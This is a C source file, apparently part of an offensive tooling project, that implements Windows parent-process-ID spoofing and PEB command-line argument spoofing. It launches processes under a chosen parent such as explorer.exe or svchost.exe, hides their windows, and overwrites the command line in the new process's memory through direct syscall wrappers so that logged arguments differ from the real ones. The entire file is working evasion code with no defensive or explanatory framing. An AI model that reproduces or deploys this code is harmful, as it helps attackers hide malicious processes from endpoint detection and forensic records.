/**
 * ppid_spoof.c - PPID spoofing and PEB command-line argument spoofing.
 */
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <winternl.h>
#include "../../include/evasion.h"
#include "../../include/syscalls.h"

#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS ((DWORD_PTR)0x00020000)
#endif

#ifndef ProcessBasicInformation
#define ProcessBasicInformation 0
#endif

typedef struct _PROCESS_BASIC_INFORMATION_S {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION_S;

typedef struct _UNICODE_STRING_S {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING_S;

typedef BOOL (WINAPI *pInitializeProcThreadAttributeList)(
    LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
typedef BOOL (WINAPI *pUpdateProcThreadAttribute)(
    LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
typedef void (WINAPI *pDeleteProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST);

typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
    HANDLE, ULONG, PVOID, ULONG, PULONG);

static BOOL resolve_proc_thread_attr(
    pInitializeProcThreadAttributeList *fnInit,
    pUpdateProcThreadAttribute *fnUpdate,
    pDeleteProcThreadAttributeList *fnDelete)
{
    HMODULE hKernel = GetModuleHandleA("kernel32.dll");
    if (!hKernel)
        return FALSE;

    *fnInit = (pInitializeProcThreadAttributeList)
        GetProcAddress(hKernel, "InitializeProcThreadAttributeList");
    *fnUpdate = (pUpdateProcThreadAttribute)
        GetProcAddress(hKernel, "UpdateProcThreadAttribute");
    *fnDelete = (pDeleteProcThreadAttributeList)
        GetProcAddress(hKernel, "DeleteProcThreadAttributeList");

    return *fnInit && *fnUpdate && *fnDelete;
}

static DWORD find_process_pid(const wchar_t *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32W pe = {sizeof(pe)};
    DWORD pid = 0;

    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }

    CloseHandle(snap);
    return pid;
}

DWORD find_suitable_parent_pid(void) {
    DWORD pid = find_process_pid(L"explorer.exe");
    if (pid)
        return pid;

    pid = find_process_pid(L"svchost.exe");
    if (pid)
        return pid;

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return 0;

    DWORD self = GetCurrentProcessId();
    PROCESSENTRY32W pe = {sizeof(pe)};
    DWORD parent = 0;

    if (Process32FirstW(snap, &pe)) {
        do {
            if (pe.th32ProcessID == self) {
                parent = pe.th32ParentProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }

    CloseHandle(snap);
    return parent;
}

BOOL patch_peb_command_line(HANDLE hProcess, const char *exe, const char *real_args) {
    if (!hProcess || !exe)
        return FALSE;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll)
        return FALSE;

    pNtQueryInformationProcess NtQueryInformationProcess =
        (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
    if (!NtQueryInformationProcess)
        return FALSE;

    PROCESS_BASIC_INFORMATION_S pbi = {0};
    ULONG ret_len = 0;
    if (NtQueryInformationProcess(hProcess, ProcessBasicInformation,
                                  &pbi, sizeof(pbi), &ret_len) != 0 ||
        !pbi.PebBaseAddress)
        return FALSE;

    PVOID peb_params = NULL;
    SIZE_T read = 0;
#ifdef _WIN64
    const SIZE_T kParamsOffset = 0x20;
    const SIZE_T kCmdLineOffset = 0x70;
#else
    const SIZE_T kParamsOffset = 0x10;
    const SIZE_T kCmdLineOffset = 0x40;
#endif

    if (sys_NtReadVirtualMemory(hProcess,
                                (PBYTE)pbi.PebBaseAddress + kParamsOffset,
                                &peb_params, sizeof(peb_params), &read) != 0 ||
        !peb_params)
        return FALSE;

    UNICODE_STRING_S cmd = {0};
    if (sys_NtReadVirtualMemory(hProcess,
                                (PBYTE)peb_params + kCmdLineOffset,
                                &cmd, sizeof(cmd), &read) != 0 ||
        !cmd.Buffer || cmd.MaximumLength < sizeof(WCHAR))
        return FALSE;

    wchar_t wexe[MAX_PATH] = {0};
    wchar_t wargs[MAX_PATH] = {0};
    MultiByteToWideChar(CP_ACP, 0, exe, -1, wexe, MAX_PATH);
    if (real_args && real_args[0])
        MultiByteToWideChar(CP_ACP, 0, real_args, -1, wargs, MAX_PATH);

    wchar_t wline[MAX_PATH * 2] = {0};
    if (wargs[0])
        _snwprintf(wline, MAX_PATH * 2 - 1, L"\"%s\" %s", wexe, wargs);
    else
        _snwprintf(wline, MAX_PATH * 2 - 1, L"\"%s\"", wexe);

    SIZE_T wlen = (lstrlenW(wline) + 1) * sizeof(WCHAR);
    if (wlen > cmd.MaximumLength)
        wlen = cmd.MaximumLength;

    SIZE_T written = 0;
    if (sys_NtWriteVirtualMemory(hProcess, cmd.Buffer, wline, wlen, &written) != 0)
        return FALSE;

    USHORT new_len = (USHORT)((wlen > sizeof(WCHAR)) ? (wlen - sizeof(WCHAR)) : 0);
    return sys_NtWriteVirtualMemory(hProcess,
                                    (PBYTE)peb_params + kCmdLineOffset,
                                    &new_len, sizeof(new_len), &written) == 0;
}

BOOL create_process_ppid_spoof(
    DWORD parent_pid,
    const char *target_exe,
    const char *spoofed_args,
    const char *real_args,
    BOOL suspended,
    PROCESS_INFORMATION *pi_out)
{
    if (!target_exe || !pi_out)
        return FALSE;

    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid);
    if (!hParent)
        return FALSE;

    pInitializeProcThreadAttributeList fnInit = NULL;
    pUpdateProcThreadAttribute fnUpdate = NULL;
    pDeleteProcThreadAttributeList fnDelete = NULL;

    if (!resolve_proc_thread_attr(&fnInit, &fnUpdate, &fnDelete)) {
        CloseHandle(hParent);
        return FALSE;
    }

    SIZE_T attrSize = 0;
    fnInit(NULL, 1, 0, &attrSize);

    LPPROC_THREAD_ATTRIBUTE_LIST pAttrList =
        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attrSize);
    if (!pAttrList) {
        CloseHandle(hParent);
        return FALSE;
    }

    if (!fnInit(pAttrList, 1, 0, &attrSize)) {
        HeapFree(GetProcessHeap(), 0, pAttrList);
        CloseHandle(hParent);
        return FALSE;
    }

    if (!fnUpdate(pAttrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                  &hParent, sizeof(HANDLE), NULL, NULL)) {
        fnDelete(pAttrList);
        HeapFree(GetProcessHeap(), 0, pAttrList);
        CloseHandle(hParent);
        return FALSE;
    }

    STARTUPINFOEXA si = {0};
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.lpAttributeList = pAttrList;

    DWORD flags = EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW;
    if (suspended)
        flags |= CREATE_SUSPENDED;

    char cmdLine[MAX_PATH * 2] = {0};
    if (spoofed_args && spoofed_args[0])
        _snprintf(cmdLine, sizeof(cmdLine) - 1, "\"%s\" %s", target_exe, spoofed_args);
    else
        _snprintf(cmdLine, sizeof(cmdLine) - 1, "\"%s\"", target_exe);

    BOOL result = CreateProcessA(
        NULL, cmdLine, NULL, NULL, FALSE, flags,
        NULL, NULL, (LPSTARTUPINFOA)&si, pi_out);

    if (result && real_args && spoofed_args &&
        lstrcmpA(spoofed_args, real_args) != 0) {
        patch_peb_command_line(pi_out->hProcess, target_exe, real_args);
    }

    fnDelete(pAttrList);
    HeapFree(GetProcessHeap(), 0, pAttrList);
    CloseHandle(hParent);

    return result;
}

BOOL create_process_ppid_spoof_w(
    DWORD parent_pid,
    const wchar_t *target_exe,
    const wchar_t *spoofed_args,
    const wchar_t *real_args,
    BOOL suspended,
    PROCESS_INFORMATION *pi_out)
{
    if (!target_exe || !pi_out)
        return FALSE;

    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid);
    if (!hParent)
        return FALSE;

    pInitializeProcThreadAttributeList fnInit = NULL;
    pUpdateProcThreadAttribute fnUpdate = NULL;
    pDeleteProcThreadAttributeList fnDelete = NULL;

    if (!resolve_proc_thread_attr(&fnInit, &fnUpdate, &fnDelete)) {
        CloseHandle(hParent);
        return FALSE;
    }

    SIZE_T attrSize = 0;
    fnInit(NULL, 1, 0, &attrSize);

    LPPROC_THREAD_ATTRIBUTE_LIST pAttrList =
        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attrSize);
    if (!pAttrList) {
        CloseHandle(hParent);
        return FALSE;
    }

    if (!fnInit(pAttrList, 1, 0, &attrSize)) {
        HeapFree(GetProcessHeap(), 0, pAttrList);
        CloseHandle(hParent);
        return FALSE;
    }

    if (!fnUpdate(pAttrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                  &hParent, sizeof(HANDLE), NULL, NULL)) {
        fnDelete(pAttrList);
        HeapFree(GetProcessHeap(), 0, pAttrList);
        CloseHandle(hParent);
        return FALSE;
    }

    STARTUPINFOEXW si = {0};
    si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE;
    si.lpAttributeList = pAttrList;

    DWORD flags = EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW;
    if (suspended)
        flags |= CREATE_SUSPENDED;

    wchar_t cmdLine[MAX_PATH * 2] = {0};
    if (spoofed_args && spoofed_args[0])
        _snwprintf(cmdLine, MAX_PATH * 2 - 1, L"\"%s\" %s", target_exe, spoofed_args);
    else
        _snwprintf(cmdLine, MAX_PATH * 2 - 1, L"\"%s\"", target_exe);

    BOOL result = CreateProcessW(
        NULL, cmdLine, NULL, NULL, FALSE, flags,
        NULL, NULL, (LPSTARTUPINFOW)&si, pi_out);

    if (result && real_args && spoofed_args &&
        wcscmp(spoofed_args, real_args) != 0) {
        char exe_a[MAX_PATH] = {0};
        char real_a[MAX_PATH * 2] = {0};
        WideCharToMultiByte(CP_ACP, 0, target_exe, -1, exe_a, MAX_PATH, NULL, NULL);
        WideCharToMultiByte(CP_ACP, 0, real_args, -1, real_a, MAX_PATH * 2, NULL, NULL);
        patch_peb_command_line(pi_out->hProcess, exe_a, real_a);
    }

    fnDelete(pAttrList);
    HeapFree(GetProcessHeap(), 0, pAttrList);
    CloseHandle(hParent);

    return result;
}
